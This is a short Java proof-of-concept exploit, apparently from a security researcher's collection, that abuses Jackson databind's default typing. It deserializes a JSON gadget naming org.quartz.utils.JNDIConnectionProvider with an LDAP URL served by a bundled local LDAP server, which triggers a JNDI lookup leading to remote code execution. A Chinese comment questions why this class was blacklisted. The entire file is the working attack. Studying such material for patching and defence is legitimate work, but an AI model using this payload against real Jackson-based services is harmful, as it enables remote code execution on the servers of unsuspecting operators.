package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 * @author threedr3am
 */
public class QuartzPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    //todo 不知为何官方加这个黑名单，明明构造方法形式最多只能选择1个参数的构造方法，而听说有人居然复现成功了？？？...
    String json = "[\"org.quartz.utils.JNDIConnectionProvider\", \"ldap://localhost:43658/Calc\", false]";
    mapper.readValue(json, Object.class);
  }


}
